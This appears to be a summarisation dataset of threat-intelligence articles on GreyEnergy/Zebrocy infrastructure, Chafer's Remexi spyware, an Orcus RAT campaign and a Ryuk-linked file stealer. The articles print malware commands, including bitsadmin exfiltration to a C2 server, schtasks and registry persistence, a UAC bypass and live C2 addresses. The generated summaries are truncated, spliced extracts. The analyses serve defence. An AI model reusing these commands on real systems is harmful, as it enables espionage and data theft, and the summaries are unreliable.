(4de5adb865b5198b4f2593ad436fceff, exploiting CVE-2017-11882) The original document (Seminar.rtf) was hosted on the same server and downloaded by victims from: hxxp://193.23.181[.]151/ministerstvo-energetiki/seminars/2019/06/Seminar.rtfAnother server we detected that was used both by Zebrocy and by GreyEnergy is 185.217.0[.]124. Similarly, we detected a spearphishing GreyEnergy document (a541295eca38eaa4fde122468d633083, exploiting CVE-2017-11882), also named ""Seminar.rtf"".This document downloads a GreyEnergy sample (78734cd268e5c9ab4184e1bbe21a6eb9) from the following SMB link:\\185.217.0[.]124\Doc\Seminar\Seminar_2018_1.AO-AThe following Zebrocy samples use this server as C2:7f20f7fbce9deee893dbce1a1b62827d170d2721b91482e5cabf3d2fec0911513803af6700ff4f712cd698cee262d4ace3100228f90692a19f88d9acb620960dThey retrieve additional data from the following URL:hxxp://185.217.0[.]124/help-desk/remote-assistant-service/PostId.php?q={hex}It is worth noting that at least two samples from the above list use both 193.23.181[.]151 and 185.217.0[.]124 as C2s.Attacked companyAdditionally, both GreyEnergy and Zebrocy spearphishing documents targeted a number of industrial companies in Kazakhstan. One of them was attacked in June 2018.Attack timeframeA spearphishing document entitled 'Seminar.rtf', which retrieved a GreyEnergy sample, was sent to the company approximately on June 21, 2018, followed by a Zebrocy spearphishing document sent approximately on June 28:The two C2 servers discussed above were actively used by Zebrocy and GreyEnergy almost at the same time:193.23.181[.]151 was used by GreyEnergy and Zebrocy in June 2018185.217.0[.]124 was used by GreyEnergy between May and June 2018 and by Zebrocy in June 2018ConclusionsThe GreyEnergy/BlackEnergy actor is an advanced group that possesses extensive knowledge on penetrating into their victim's networks and exploiting any vulnerabilities it finds. This actor has demonstrated its ability to update its tools and infrastructure in order to avoid detection, tracking, and attribution.Though no direct evidence exists on the origins of GreyEnergy, the links between a Sofacy subset known as Zebrocy and GreyEnergy suggest that these groups are related, as has been suggested before by some public analysis. In this paper, we detailed how both groups shared the same C2 server infrastructure during a certain period of time and how they both targeted the same organization almost at the same time, which seems to confirm the relationship's existence.For more information about APT reports please contact: intelreports@kaspersky.comFor more information about ICS threats please contact: ics-cert@kaspersky.com";GreyEnergy/BlackEnergy actor is an advanced group that possesses extensive knowledge on penetrating into their victim's networks and exploiting any vulnerabilities it finds. This actor has demonstrated its ability to update its tools and infrastructure in order to avoid detection, tracking, and attribution.Though no direct evidence exists on the origins of GreyEnergy, the links between a Sofacy subset known as Zebrocy and GreyEnergy suggest that these groups are related, as has been suggested before by some public analysis. In this paper, we detailed how both groups shared the same C2 server infrastructure during a certain period of time and how they both targeted the same organization almost at the same time, which seems to confirm the relationship's existence.For more information about APT reports please contact: intelreports@kaspersky.comFor more information about ICS threats please contact: icscert@kaspersky.com;en;{'r': 0.33974358974358976, 'p': 0.9906542056074766, 'f': 0.5059665833090493};{'r': 0.24022346368715083, 'p': 0.9847328244274809, 'f': 0.3862275417571893};{'r': 0.33974358974358976, 'p': 0.9906542056074766, 'f': 0.5059665833090493}
https://securelist.com/chafer-used-remexi-malware/89538/;Chafer used Remexi malware to spy on Iran-based foreign diplomatic entities;"Executive SummaryThroughout the autumn of 2018 we analyzed a long-standing (and still active at that time) cyber-espionage campaign that was primarily targeting foreign diplomatic entities based in Iran. The attackers were using an improved version of Remexi in what the victimology suggests might be a domestic cyber-espionage operation. This malware has previously been associated with an APT actor that Symantec calls Chafer.The malware can exfiltrate keystrokes, screenshots, browser-related data like cookies and history, decrypted when possible. The attackers rely heavily on Microsoft technologies on both the client and server sides: the Trojan uses standard Windows utilities like Microsoft Background Intelligent Transfer Service (BITS) bitsadmin.exe to receive commands and exfiltrate data. Its C2 is based on IIS using .asp technology to handle the victims' HTTP requests.Remexi developers use the C programming language and GCC compiler on Windows in the MinGW environment. They most likely used the Qt Creator IDE in a Windows environment. The malware utilizes several persistence mechanisms including scheduled tasks, Userinit and Run registry keys in the HKLM hive.XOR and RC4 encryption is used with quite long unique keys for different samples. Among all these random keys once the word ""salamati"" was also used, which means ""health"" in Farsi.Kaspersky Lab products detect the malware described in this report as Trojan.Win32.Remexi and Trojan.Win32.Agent. This blogpost is based in our original report shared with our APT Intelligence Reporting customers last November 2018. For more information please contact: intelreports@kaspersky.comTechnical analysisThe main tool used in this campaign is an updated version of the Remexi malware, publicly reported by Symantec back in 2015. The newest module's compilation timestamp is March 2018. The developers used GCC compiler on Windows in the MinGW environment.Inside the binaries the compiler left references to the names of the C source file modules used: ""operation_reg.c"", ""thread_command.c"" and ""thread_upload.c"". Like mentioned in modules file names the malware consists of several working threads dedicated to different tasks, including C2 command parsing and data exfiltration. For both the receiving of C2 commands and exfiltration, Remexi uses the Microsoft Background Intelligent Transfer Service (BITS) mechanism to communicate with the C2 over HTTP.ProliferationSo far, our telemetry hasn't provided any concrete evidence that shows us how the Remexi malware spread. However, we think it's worth mentioning that for one victim we found a correlation between the execution of Remexi's main module and the execution of an AutoIt script compiled as PE, which we believe may have dropped the malware. This dropper used an FTP with hardcoded credentials to receive its payload. FTP server was not accessible any more at the time of our analysis.Malware featuresRemexi boasts features that allow it to gather keystrokes, take screenshots of windows of interest (as defined in its configuration), steal credentials, logons and the browser history, and execute remote commands. Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim's data.Remexi includes different modules that it deploys in its working directory, including configuration decryption and parsing, launching victim activity logging in a separate module, and seven threads for various espionage and auxiliary functions. The Remexi developers seem to rely on legitimate Microsoft utilities, which we enumerate in the table below.Utility Usage extract.exe Deploys modules from the .cab file into the working Event Cache directory bitsadmin.exe Fetches files from the C2 server to parse and execute commands. Send exfiltrated data taskkill.exe Ends working cycle of modulesPersistencePersistence modules are based on scheduled tasks and system registry. Mechanisms vary for different OS versions. In the case of old Windows versions like XP, main module events.exe runs an edited XPTask.vbs Microsoft sample script to create a weekly scheduled task for itself. For newer operating systems, events.exe creates task.xml as follows:Then it creates a Windows scheduled task using the following command:schtasks.exe /create /TN \""Events\\CacheTask_"" /XML \""t /F"" 1 schtasks . exe / create / TN \ "" Events \ \ CacheTask_ "" /XML \""t /F""At the system registry level, modules achieve persistence by adding themselves into the key:HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinitwhen it finds possible add values to the Winlogon subkey, and inHKLM\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Activity Manager. All such indicators of comprometation are mentioned in correspondent appendix below.CommandsAll the commands received from the C2 are first saved to an auxiliary file and then stored encrypted in the system registry. The standalone thread will decrypt and execute them.Command Description search Searches for corresponding files search&upload Encrypts and adds the corresponding files to the upload directory with the provided name uploadfile Encrypts and adds the specified file to the upload directory with the provided name uploadfolder Encrypts and adds the mentioned directory to the upload directory with the provided name shellexecute Silently executes received command with cmd.exe wmic Silently executes received command with wmic.exe (for WMI commands) sendIEPass Encrypts and adds all gathered browser data into files for upload to C2 uninstall Removes files, directory and BITS tasksCryptographyTo decrypt the configuration data, the malware uses XOR with 25-character keys such as ""waEHleblxiQjoxFJQaIMLdHKz"" that are different for every sample. RC4 file encryption relies on the Windows 32 CryptoAPI, using the provided value's MD5 hash as an initial vector. Among all these random keys once the word ""salamati"" was also used, which means ""health"" in Farsi.ConfigurationConfig.ini is the file where the malware stores its encrypted configuration data. It contains the following fields:Field Sample value Description diskFullityCheckRatio 1.4 Malware working directory size threshold. It will be deleted if it becomes as large as the free available space multiplied by this ratio captureScreenTimeOut 72 Probability of full and active window screenshots being taken after mouse click captureActiveWindowTimeOut 313 captureScreenQC 40 Not really used. Probably full and active window screenshot quality captureActiveQC 40 CaptureSites VPN*0,0Login*0,0mail*0,0Security*0,0 Window titles of interest for screenshots, using left mouse button and Enter keypress hook important upLog.txtupSCRLog.txtupSpecial.txtupFile.txtupMSLog.txt List of files to send to C2 using bitsadmin.exe from the dedicated thread maxUpFileSizeKByte 1000000 Maximum size of file uploaded to C2 Servers http://108.61.189.174 Control server HTTP URL ZipPass KtJvOXulgibfiHk Password for uploaded zip archives browserPasswordCheckTimeout 300000 Milliseconds to wait between gathering key3.db, cookies.sqlite and other browser files in dedicated threadMost of the parameters are self-explanatory. However, captureScreenTimeOut and captureActiveWindowTimeOut are worth describing in more detail as their programming logic is not so intuitive.One of the malware threads checks in an infinite loop if the mouse button was pressed and then also increments the integer iterator infinitely. If the mouse hooking function registers a button hit, it lets the screenshotting thread know about it through a global variable. After that, it checks if the iterator divided by (captureScreenTimeOut/captureActiveWindowTimeOut) has a remainder of 0. In that case, it takes a screenshot.Main module (events.exe)SHA256 b1fa803c19aa9f193b67232c9893ea57574a2055791b3de9f836411ce000ce31 MD5 c981273c32b581de824e1fd66a19a281 Compiled GCC compiler in MinGW environment version 2.24, timestamp set to 1970 by compiler Type I386 Windows GUI EXE Size 68 608After checking that the malware is not already installed, it unpacks HCK.cab using the Microsoft standard utility expand.exe with the following arguments:expand.exe -r \""\"" -f:* \""\\\"" 1 expand . exe - r \ "" \ "" - f : * \ "" \ \ \ ""Then it decrypts config.ini file with a hardcoded 25-byte XOR key that differs for every sample. It sets keyboard and mouse hooks to its handlekeys() and MouseHookProc() functions respectively and starts several working threads:ID Thread description 1 Gets commands from C2 and saves them to a file and system registry using the bitsadmin.exe utility 2 Decrypts command from registry using RC4 with a hardcoded key, and executes it 3 Transfers screenshots from the clipboard to \Cache005 subdirectory and Unicode text from clipboard to log.txt, XOR-ed with the ""salamati"" key (""health"" in Farsi) 4 Transfers screenshots to \Cache005 subdirectory with captureScreenTimeOut and captureScreenTimeOut frequencies 5 Checks network connection, encrypts and sends gathered logs 6 Unhooks mouse and keyboard, removes bitsadmin task 7 Checks if malware's working directory size already exceeds its threshold 8 Gathers victim's credentials, visited website cache, decrypted Chrome login data, as well as Firefox databases with cookies, keys, signons and downloadsThe malware uses the following command to receive data from its C2:bitsadmin.exe /TRANSFER HelpCenterDownload /DOWNLOAD /PRIORITY normal http:///asp.asp?ui=nrg-- 1 2 bitsadmin . exe / TRANSFER HelpCenterDownload / DOWNLOAD / PRIORITY normal http : ///asp.asp?ui=nrg--Activity logging module (Splitter.exe)This module is called from the main thread to obtain screenshots of windows whose titles are specified in the configuration CaptureSites field, bitmaps and text from clipboard, etc.SHA256 a77f9e441415dbc8a20ad66d4d00ae606faab370ffaee5604e93ed484983d3ff MD5 1ff40e79d673461cd33bd8b68f8bb5b8 Compiled 2017.08.06 11:32:36 (GMT), 2.22 Type I386 Windows Console EXE Size 101 888Instead of implementing this auxiliary module in the form of a dynamic linked library with its corresponding exported functions, the developers decided to use a standalone executable started by events.exe with the following parameters:Parameter Description -scr Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration. Can capture all screen (""AllScreen"") or the active window (""ActiveWindow"") -ms Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration. Specifies the screen coordinates to take -zip Name of password (from configuration data) protected zip archive -clipboard Screenshot file name where a bitmap from the clipboard is saved in Cache005 subdirectory, zipped with password from configurationData exfiltrationExfiltration is done through the bitsadmin.exe utility . The BITS mechanism has existed since Windows XP up to the current Windows 10 versions and was developed to create download/upload jobs, mostly to update the OS itself. The following is the command used to exfiltrate data from the victim to the C2:bitsadmin.exe /TRANSFER HelpCenterUpload /UPLOAD /PRIORITY normal ""/YP01__"" """" 1 bitsadmin . exe / TRANSFER HelpCenterUpload / UPLOAD / PRIORITY normal ""/YP01__"" """"VictimsThe vast majority of the users targeted by this new variant of Remexi appear to have Iranian IP addresses. Some of these appear to be foreign diplomatic entities based in the country.AttributionThe Remexi malware has been associated with an APT actor called Chafer by Symantec.One of the human-readable encryption keys used is ""salamati"". This is probably the Latin spelling for the word ""health"" in Farsi. Among the artifacts related to malware authors, we found in the binaries a .pdb path containing the Windows user name ""Mohamadreza New"". Interestingly, the FBI website for wanted cybercriminals includes two Iranians called Mohammad Reza, although this could be a common name or even a false flag.ConclusionsActivity of the Chafer APT group has been observed since at least 2015, but based on things like compilation timestamps and C&C registration, it's possible they have been active for even longer. Traditionally, Chafer has been focusing on targets inside Iran, although their interests clearly include other countries in the Middle East.We will continue to monitor how this set of activity develops in the future.Indicators of compromiseFile hashesevents.exe028515d12e9d59d272a2538045d1f63603055149340b7a1fd218006c98b3048225469ddaeff0dd3edb0f39bbe1dcdc4641b2339950d50cf678c0e5b34e68f5374bf178f778255b6e72a317c2eb8f41037d1efce9c06a310627f47e7d70543aaf9f313e8ef91ac899a27575bc5af64051aa6246dc04e9089e366cc57a447fc3a4c981273c32b581de824e1fd66a19a281dcb0ea3a540205ad11f32b67030c1e5asplitter.exec6721344af76403e9a7d816502dca1c8d3a2b41b1cd953d254c0fc88071e50271FF40E79D673461CD33BD8B68F8BB5B8ecae141bb068131108c1cd826c82d88b12477223678e4a41020e66faebd3dd95460211f1c19f8b213ffaafcdda2a729553e035273164f24c200262d61fa374caDomains and IPs108.61.189.174Hardcoded mutexesLocal\TEMPDAHCE01Local\zaaprLocal\reezaaprLogLocal\{Temp-00-aa-123-mr-bbb}Scheduled taskCacheTask_<user_name_here>Directory with malicious modulesMain malware directory: %APPDATA%\Microsoft\Event CacheCommands from C2 in subdirectory: Cache001\cde00.acfEvents.exe persistence records in Windows system registry keysHKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\UserinitHKLM\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Activity ManagerVictims' fingerprints stored inHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\PidRegData orHKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\PidRegDataRC4 encrypted C2 commands stored inHKCU\SOFTWARE\Microsoft\FaxHTTP requests templatehttp://<server_ip_from_config>/asp.asp?ui=<host_name>nrg-<adapter_info>-<user_name>And bitsadmin.exe task to external network resources, addressed by IP addresses";"The ITSecurity report summarizes the Remexi malware's features, which include the ability to gather keystrokes, take screenshots of windows of interest, steal credentials, logons and the browser history, and execute remote commands. Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim's data. Remexi includes different modules that it deploys in its working directory, including configuration decryption and parsing, launching victim activity logging in a separate module, and seven threads for various espionage and auxiliary functions. The Remexi developers seem to rely on legitimate Microsoft utilities, which we enumerate in the table below. Utility Usage extract.exe Deploys modules from the .cab file into the working Event Cache directory bitsadmin.exe Fetches files from the C2 server to parse and execute commands. Send exfiltrated data taskkill.exe Ends working cycle of modulesPersistencePersistence modules are based on scheduled tasks and system registry. Mechanisms vary for different OS versions. In the case of old Windows versions like XP, main module events.exe runs an edited XPTask.vbs Microsoft sample script to create a weekly scheduled task for itself. For newer operating systems, events.exe creates task.xml as follows:Then it creates a Windows scheduled task using the following command:schtasks.exe /create /TN \""Events\\CacheTask_"" /XML \""t /F"" 1 schtasks . exe / create / TN \ "" Events \ \ CacheTask_ "" /XML \""t /F""At the system registry level, modules achieve persistence by adding themselves into the key:HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinitwhen it finds possible add values to the Winlogon subkey, and";en;{'r': 0.1969519343493552, 'p': 0.9710982658959537, 'f': 0.32748537731326643};{'r': 0.14507129572225666, 'p': 0.9473684210526315, 'f': 0.2516129009225864};{'r': 0.1969519343493552, 'p': 0.9710982658959537, 'f': 0.32748537731326643}
https://blog.morphisec.com/new-campaign-delivering-orcus-rat;New Campaign Delivers Orcus RAT;"This post was authored by Michael Gorelik, Alon Groisman and Bruno Braga .A new, highly sophisticated campaign that delivers the Orcus Remote Access Trojan is hitting victims in ongoing, targeted attacks. Morphisec identified the campaign after receiving notifications from its advanced prevention solution at several deployment sites. (Morphisec's Moving Target Defense technology immediately stopped the threat.) The attack uses multiple advanced evasive techniques to bypass security tools. In a successful attack, the Orcus RAT can steal browser cookies and passwords, launch server stress tests (DDoS attacks), disable the webcam activity light, record microphone input, spoof file extensions, log keystrokes and more. (More about Orcus RAT below.)The forensic data captured by Morphisec from the attack showed a high correlation to additional samples in the wild, indicating a single threat actor is behind multiple campaigns, including this one.This threat actor specifically focuses on information stealing and .NET evasion. Based on unique strings in the malware, we have dubbed the actor PUSIKURAC. Before executing the attacks, PUSIKURAC registers domains through FreeDns services. It also utilizes legitimate free text storage services like paste, signs its executables, heavily missuses commercial .NET packers and embeds payloads within video files and images.In this blog we choose to focus and demystify one specific attack chain executed by the attacker. We will show the full attack chain, analyzing one of the more interesting malware downloaders that we have investigated over the past year, including its delivered payload - the Orcus RAT.Technical explanationBased on the initial attack data, we could see that the attack flow proceeds as follows: A persistent VBscript executes a PowerShell script that downloads a .NET executable obfuscated and encrypted by ConfuserEx. The downloaded executable performs known UAC bypass through event viewer registry hijacking to get the highest privileges.The running process with the highest privileges downloads a legitimate Ramadan-themed Coca-Cola advertising video, which contains an embedded .NET Orcus RAT.Each stage of the attack includes additional obfuscation and custom encryption steps, as described below.DownloaderOne of the more interesting stages of the attack is the downloader - System32Batch94ver1.exe (B4136B21B9E95FD1FA9C52BD897F4D2F). The .NET downloader is signed by a non-valid Notepad++ certificate.The downloader is encrypted by a known obfuscation framework (ConfuserEx) and further obfuscated by a custom algorithm that can transform strings representing binary number patterns to readable strings and byte arrays. The malware also has the functionality of downloading additional stages from paste.ee & bit.ly under certain conditions.ConfuserEx encrypted binary:Most of the ConfuserEx unpackers didn't fully work on this sample out of the box, we needed to modify one of the unpackers. Following a successful control flow repair, decryption of constants, strings and the de-obfuscation of the names we identified a readable .NET library.As noted previous, we needed to apply some of the decoding algorithms implemented within the binary in order to deobfuscate the next stage binary patterns (similar patterns are downloaded from hxxps://paste[.]ee/r/O53RV). The identified strings revealed the persistency methods of the binary, privilege escalation techniques used to bypass UAC, and next stage artifacts embedded. Some of these strings are included in Table 1 below:Although the original string table includes much more information, we will focus on the strings included in the table above.The eventvwr.exe, mmc and mscfile registry hijack clearly indicate a known UAC bypass technique utilized by malware over the last 2 years - hijacking the mscfile registry key will cause the event viewer to execute the given process with highest privileges. The vmtoolsd and the Sandboxie strings indicate known anti-VM techniques. The VBScript code templates, which are compiled by the .NET binary and the task schedule procedures, are indicators for persistency and disconnection of the attack chain (as in the scenario we are analyzing).The last string was the only one that is not self-explainable and looked unique. This prompted us to use it as the name for the threat actor.While hunting for additional strings, we identified an interesting method that is responsible for the AES decryption of one of the encrypted resources:The function iterates over its four resources until it finds a resource stream that starts with the leet cookie (1337). It then extracts the key and the initialization vector for a successful AES decryption of the resource.Decryption of the ""QFwMhceaY.Resources"" resource reveals an additional set of URLs, filename extensions and .NET target version:Again, the actual string table contains more information and we have included only the most relevant.The first string is the URL path for the bit.ly (one of the leading URL shorteners). This path hosts a redirector to the next stage malware (Orcus RAT embedded inside mp4 video file).The second string is an executable name, which is later concatenated with the .exe extension and used to replace the Name.exe template within the VB script shown in Table 1.hxxps://paste[.]ee/r/bOZW3 contains another encrypted Assembly executable that is later fetched from the internet (exhibits the same binary patterns as seen inside downloader binary). This is described below.The binary pattern is decrypted into a byte array (same way as previous strings), then it is XOR'd with multiple embedded characters and transformed into a new embedded assembly. Under certain conditions our downloader will execute this Assembly by invoking its Method.The decrypted assembly is minimally obfuscated, its long constant and function names can be easily de-obfuscated using a basic de4dot. Looking deeper inside the assembly, we identified process hollowing functionality that is used to hide additional executable code within new process.AES is applied here as well on internal byte array and the C.resources artifacts to be used as parameters to the hollowing process (hollowing cmd).Orcus remote access trojanAs stated previously, the downloader downloads a legitimate 18 MB Ramadam-themed Coca-Cola commerical (09751bf69d496aaa3c92df5ed446785b).Although the video looks harmless, it is appended with a .NET executable which represents the Orcus RAT.The attached Orcus executable is delivered with AES encrypted settings (the SIGNATURE string is the key). To properly decrypt the settings we needed to decompress the embedded Fody-Costura DLLs (deflate the streams) that relate to the AES encryption (Orcus.Shared.dll) and extract the initialization vector byte array.With all the decryption keys and the encrypted setting in hand, we easily extracted the full xml settings for the RAT.It was interesting to discover that someone else identified the same C2 server and decided to hack back the attacker's servers https://twitter.com/GuyFoqs/status/1085803756644528129 .more on Orcus ratThe Orcus RAT masquerades as a legitimate remote administration tool, although it is clear from its features and functionality that it is not and was never intended to be. (Brian Krebs published an interesting expose on the man behind the supposed administration tool.) Until two weeks ago, it was publicly sold and licensed by a company calling itself Orcus Technologies. The project is now closed, according to a ""press release"" issued, and a license-free version available for download, as well as software development tools and documentation. Interestingly, the author also claims there is a ""kill switch"" available for download by security researchers to remotely shut down and lock out any Orcus control server that they find are being used for malicious purposes.ConclusionsGiven that Orcus Trojan was recently made freely available, we expect to see more attacks delivering new Orcus RAT variants as a payload.As this latest attack demonstrates, organizations may improve their defenses but attackers find new ways to get around them. Morphisec customers are protected from this campaign as well as future Orcus variants with its Moving Target Defense solution that is architected specifically to handle unknown evasive attacks.Artifacts:URLshxxps://syswow32batch[.]su/WOW/hxxps://salesgroup[.]top/Micro18/hxxp://bit[.]ly/2FRI9rEhxxps://paste[.]ee/r/bOZW3hxxps://paste[.]ee/r/O53RVhxxps://pomf.pyonpyon[.]moe/wmtqck.mp4hxxps://pomf.pyonpyon[.]moe/ggesuy.jpg (different info stealer)Downloader:2091F8A68BE181B0149C83DCBF2CFC05MP4 Advertisement (embedded Orcus RAT)09751BF69D496AAA3C92DF5ED446785B (mp4)161307CD9FA201256B0D17D9F3085E78F32D642A (embedded Orcus)C2:weirdly.crabdance[.]compoulty55.chickenkiller[.]com194.5.98[.]139:9030Additional ArtifactsStrings: ""Dole Food Company"" (this string appeared in many of the .NET assemblies from multiple different attack chains, it also appeared in some of the persistency stages)";"A new, highly sophisticated campaign that delivers the Orcus Remote Access Trojan is hitting victims in ongoing, targeted attacks. Morphisec identified the campaign after receiving notifications from its advanced prevention solution at several deployment sites. (Morphisec's Moving Target Defense technology immediately stopped the threat.) The attack uses multiple advanced evasive techniques to bypass security tools. In a successful attack, the Orcus RAT can steal browser cookies and passwords, launch server stress tests (DDoS attacks), disable the webcam activity light, record microphone input, spoof file extensions, log keystrokes and more. (More about Orcus RAT below. )The forensic data captured by Morphisec from the attack showed a high correlation to additional samples in the wild, indicating a single threat actor is behind multiple campaigns, including this one.This threat actor specifically focuses on information stealing and .NET evasion. Based on unique strings in the malware, we have dubbed the actor PUSIKURAC. Before executing the attacks, PUSIKURAC registers domains through FreeDns services. It also utilizes legitimate free text storage services like paste, signs its executables, heavily missuses commercial .NET packers and embeds payloads within video files and images.In this blog we choose to focus and demystify one specific attack chain executed by the attacker. We will show the full attack chain, analyzing one of the more interesting malware downloaders that we have investigated over the past year, including its delivered payload the Orcus RAT.Technical explanationBased on the initial attack data, we could see that the attack flow proceeds as follows: A persistent VBscript executes a PowerShell script that downloads a .NET executable obfuscated and encrypted by ConfuserEx. The downloaded executable performs known UAC The ITSecurity report states that the .NET downloader is signed by a nonvalid Notepad++ certificate. The downloader is encrypted by a known obfuscation framework (ConfuserEx) and further obfuscated by a custom algorithm that can transform strings representing binary number patterns to readable strings and byte arrays. The malware also has the functionality of downloading additional stages from paste.ee & bit.ly under certain conditions. ConfuserEx encrypted binary: Most of the ConfuserEx unpackers didn't fully work on this sample out of the box; we needed to modify one of the unpackers. Following a successful control flow repair, decryption of constants, strings and the deobfuscation of the names we identified a readable .NET library. As noted previous, we needed to apply some of the decoding algorithms implemented within the binary in order to deobfuscate the next stage binary patterns (similar patterns are downloaded from hxxps://paste[.]ee/r/O53RV). The identified strings revealed the persistency methods of the binary, privilege escalation techniques used to bypass UAC, and next stage artifacts embedded. Some of these strings are included in Table 1 below: Although the original string table includes much more information, we will focus on the strings included in the table above. The eventvwr.exe, mmc and mscfile registry hijack clearly indicate a known UAC bypass technique utilized by malware over the last 2 years hijacking the mscfile registry key will cause the event viewer to execute the given process with highest privileges. The vmtoolsd and the Sandboxie strings indicate known antiVM techniques. The VBScript code templates, which are compiled by the .NET binary and the task schedule procedures, are indicators for persistency and disconnection of the attack chain (as in the scenario we are analyz The ITSecurity report has been summarized.";en;{'r': 0.5, 'p': 0.960960960960961, 'f': 0.6577595021781313};{'r': 0.4182282793867121, 'p': 0.9515503875968992, 'f': 0.5810650845153602};{'r': 0.5, 'p': 0.960960960960961, 'f': 0.6577595021781313}
https://www.bleepingcomputer.com/news/security/ryuk-related-malware-steals-confidential-military-financial-files/;Ryuk Related Malware Steals Confidential Military, Financial Files;"A new malware with strange associations to the Ryuk Ransomware has been discovered to look for and steal confidential financial, military, and law enforcement files.While Ryuk Ransomware encrypts a victim's files and then demands a ransom, it is not known for actually stealing files from an infected computer. A new infection discovered today by MalwareHunterTeam, does exactly that by searching for sensitive files and uploading them to a FTP site under the attacker's control.To make this sample even more interesting, this data exfiltrating malware also contains some strange references to Ryuk within the code.Searching for confidential filesIn conversations with reverse engineer and security researcher Vitali Kremez, we get an idea of how the file stealer works. When executed, the stealer will perform a recursive scan of all the files on a computer and look for Word .docx and Excel .xlsx files to steal.When looking for files, if it encounters any folders or files that match certain strings, it will stop checking the file and move to the next one, similar to how ransomware would operate.A full list of the blacklisted files and folders are at the end of this article, including your standard ones such as ""Windows"", ""Intel"", ""Mozilla"", ""Public"", etc.In addition, it also skips over any files that are associated with Ryuk such as ""RyukReadMe.txt"" and files with the "".RYK"" extension.Blacklisted StringsIf the file passes the blacklist, the stealer will then check if it is a .docx or .xlsx file as shown below.Searching for .docx and .xlsx filesWhen a .docx or .xlsx file is located, the stealer will use libzip and the zip_open and zip_trace functions to verify if the file is a valid Word or Excel document. It does this by checking and validating the presence of the word/document.xml (word) or xl/worksheets/sheet (excel) files in the Office document.Verifying Word DocumentIf it is a valid file, it will then compare the file's name against a list of 77 strings. All of the strings are listed at the end of the document and include entries like ""marketwired"", ""10-Q"", ""fraud"", ""hack"", ""tank"", ""defence"", ""military"", ""checking"", ""classified"", ""secret"", ""clandestine"", undercover"", ""federal"", etc.Word of interestAs you can see the actor is looking for confidential military secrets, banking information, fraud, criminal investigation documents, and other sensitive information.Strangely, it also looks for files that contain the first names ""Emma"", ""Liam"", ""Olivia"",""Noah"", ""William"", ""Isabella"", ""James"", ""Sophia"", and ""Logan"". It is suspected that these names comes from the top baby names of 2018 as listed by the U.S. Social Security department.Any files that match a string are then uploaded via FTP to the 66.42.76.46/files_server/a8-5 server as seen in the code below.Stealing files by uploading to FTP ServerAfter scanning the local machine, the malware will then get a list of IP addresses from the computer's ARP table. It then proceeds to search for files on any available shares.Getting ARP TableIt is not known how this malware is being installed, but it was theorized by BleepingComputer, Kremez, and MalwareHunterTeam, that this infection could be run prior to infecting a machine to harvest interesting files before they are encrypted.Strange ties to Ryuk RansomwareAs we already discussed, this stealer purposely skips files associated with the Ryuk Ransomware such as RyukReadMe.txt, UNIQUE_ID_DO_NOT_REMOVE, and any files that have the .RYK extension.In addition, there are code similarities that the stealer and Ryuk Ransomware share in common. For example, the stealer contains a function that creates a new file and appends the .RYK extension as if it was encrypting the file. This function is not utilized by the stealer.Stealer contains Ryuk's create file methodThe stealer also checks for the presence of a file named Ahnlab as shown below.Stealer searching for AhnlabKremez told BleepingComputer that Ryuk Ransomware also checks for the presence of this file as shown below.Ryuk Ransomware searching for AhnlabWhile there are definite ties between this stealer and Ryuk, it is not known if the actually from the same group or someone gained access to the code and utilized it in their own program.""It might indicate someone with source access to Ryuk ransomware simply copy/pasted and modified code to make it a stealer or look like it,"" Kremez told BleepingComputer in a conversation about this malware.Furthermore, Ryuk runs without any dependencies when tested by BleepingComputer in the past, while this stealer appears to be a MingW executable that requires numerous DLLs to be present in order to properly execute.This could indicate that the stealer is being installed manually or dropped as a package with all of the necessary components.As more samples become available, we will hopefully see its install process in the future.Update 9/11/19: Added info about the names in the match list.IOCsHashes:c64269a64b64b20108df89c4f1a415936c9d9923f8761d0667aa8492aa057acb e6762cb7d09cd90d5469e3c3bfc3b47979cd67aa06c06e893015a87b0348c32cNetwork communication:FTP: 66.42.76.46/files_server/a8-5Blacklisted files and folders:Sample log .dll Sample $Recycle.Bin Tor Package RyukReadMe.txt microsoft UNIQUE_ID_DO_NOT_REMOVE PUBLIC Windows Intel PerfLogs windows Firefox Mozilla Microsoft $WINDOWS Program \\Users\\Public\\Pictures MySQLTargeted file name strings:";"A new malware with strange associations to the Ryuk Ransomware has been discovered to look for and steal confidential financial, military, and law enforcement files.While Ryuk Ransomware encrypts a victim's files and then demands a ransom, it is not known for actually stealing files from an infected computer. A new infection discovered today by MalwareHunterTeam, does exactly that by searching for sensitive files and uploading them to a FTP site under the attacker's control.To make this sample even more interesting, this data exfiltrating malware also contains some strange references to Ryuk within the code.Searching for confidential filesIn conversations with reverse engineer and security researcher Vitali Kremez, we get an idea of how the file stealer works. When executed, the stealer will perform a recursive scan of all the files on a computer and look for Word .docx and Excel .xlsx files to steal.When looking for files, if it encounters any folders or files that match certain strings, it will stop checking the file and move to the next one, similar to how ransomware would operate.A full list of the blacklisted files and folders are at the end of this article, including your standard ones such as ""Windows"", ""Intel"", ""Mozilla"", ""Public"", etc.In addition, it also skips over any files that are associated with Ryuk such as ""RyukReadMe.txt"" and files with the "".RYK"" extension.Blacklisted StringsIf the file passes the blacklist, the stealer will then check if it is a .docx or .xlsx file as shown below.Searching for .docx and .xlsx filesWhen a .docx or .xlsx file is located, the stealer will use libzip and the zip";en;{'r': 0.3910891089108911, 'p': 0.9937106918238994, 'f': 0.5612788591795412};{'r': 0.3486750348675035, 'p': 0.9960159362549801, 'f': 0.5165289217785883};{'r': 0.3910891089108911, 'p': 0.9937106918238994, 'f': 0.5612788591795412}
